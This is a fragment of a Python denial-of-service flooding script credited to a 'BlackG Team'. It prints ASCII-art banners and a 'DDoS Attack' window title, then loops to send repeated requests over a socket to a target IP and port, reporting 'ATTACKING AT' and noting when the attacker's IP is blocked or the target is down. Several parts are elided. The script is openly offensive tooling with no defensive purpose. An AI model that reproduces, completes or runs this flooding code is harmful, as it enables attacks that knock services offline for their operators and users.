...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By BlackGTeam  [ DDoS Attack ]")
print("=============================================================================")
print("░█████╗░░█████╗░██╗░░░██╗██╗██████╗░░██████╗░████████╗  ██╗░░░██╗░█████╗░")
print("██╔══██╗██╔══██╗██║░░░██║██║██╔══██╗██╔════╝░╚══██╔══╝  ██║░░░██║██╔═══╝░")
print("██║░░╚═╝██║░░██║╚██╗░██╔╝██║██║░░██║██║░░██╗░░░░██║░░░  ╚██╗░██╔╝██████╗░")
...
print("░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝╚═════╝░░╚═════╝░░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░")
print("=============================================================================")
print("[ + ] Tool Coder By : BlackG Team")
print("[ + ]  Group Tele : ")
print("[ + ] Remaked By : FizzGT")
print("[ + ] Credit : CovidGT")
print("[ + ] Dont Leak Tools")
print("==========================")
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("[ BlackG Team ] ATTACKING AT > ",ip," : ",port,".")
        except socket.error:
            s.close()
            print("[ BlackG Team ] YOUR IP GOT BLOCKED OR THE TARGET WAS DOWN")
